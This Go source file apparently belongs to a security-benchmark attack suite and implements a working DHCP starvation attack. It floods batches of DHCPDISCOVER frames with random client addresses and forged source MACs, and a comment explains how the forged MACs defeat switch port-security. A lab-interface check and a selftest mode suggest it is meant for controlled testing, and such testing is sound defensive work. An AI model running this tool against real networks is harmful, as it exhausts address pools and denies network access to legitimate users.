package main

import (
	cryptorand "crypto/rand"
	"encoding/binary"
	"fmt"
	"os"

	"github.com/rohanpunj/iolbox/tools/secbench-attacks-go/internal/attackcommon"
)

const batchSize = 20

func randomXID() (uint32, error) {
	var bytes [4]byte
	if _, err := cryptorand.Read(bytes[:]); err != nil {
		return 0, err
	}
	return binary.BigEndian.Uint32(bytes[:]), nil
}

func randomChaddr() ([6]byte, error) {
	var chaddr [6]byte
	chaddr[0] = 0x02
	if _, err := cryptorand.Read(chaddr[1:]); err != nil {
		return chaddr, err
	}
	return chaddr, nil
}

func run() int {
	fs, common := attackcommon.BaseParser("DHCP starvation: flood DISCOVER with random client MACs")
	if err := fs.Parse(os.Args[1:]); err != nil {
		return 2
	}
	if err := attackcommon.EnforceLabIface(common.Iface); err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 2
	}

	if common.Selftest {
		chaddr, err := randomChaddr()
		if err != nil {
			attackcommon.Status("FATAL", fmt.Sprintf("selftest packet build failed: %v", err))
			return 1
		}
		// A fresh forged (non-zero) L2 source per frame — required so the lab
		// bridge doesn't drop the broadcast, AND a distinct source MAC per
		// DISCOVER is what actually exhausts port-security (the BOOTP chaddr
		// alone doesn't, since port-security keys on L2 src).
		frame := attackcommon.BuildDHCPDiscover(1234, chaddr, attackcommon.ForgedMAC())
		attackcommon.SelftestOK("dhcp_starve", fmt.Sprintf("DHCPDISCOVER len=%d", len(frame)))
		return 0
	}

	sender, err := attackcommon.OpenRawSender(common.Iface)
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	defer sender.Close()

	_, err = attackcommon.RunLoop(common.Count, common.Interval, func(n int) error {
		for i := 0; i < batchSize; i++ {
			xid, err := randomXID()
			if err != nil {
				return fmt.Errorf("generate DHCP transaction ID: %w", err)
			}
			if xid == 0 {
				xid = 1
			}
			chaddr, err := randomChaddr()
			if err != nil {
				return fmt.Errorf("generate DHCP client address: %w", err)
			}
			frame := attackcommon.BuildDHCPDiscover(xid, chaddr, attackcommon.ForgedMAC())
			if err := sender.Send(frame); err != nil {
				return fmt.Errorf("send DHCPDISCOVER: %w", err)
			}
		}
		attackcommon.Status("SENT", fmt.Sprintf("batch #%d: %d random-src frames", n+1, batchSize))
		return nil
	})
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	return 0
}

func main() {
	os.Exit(run())
}
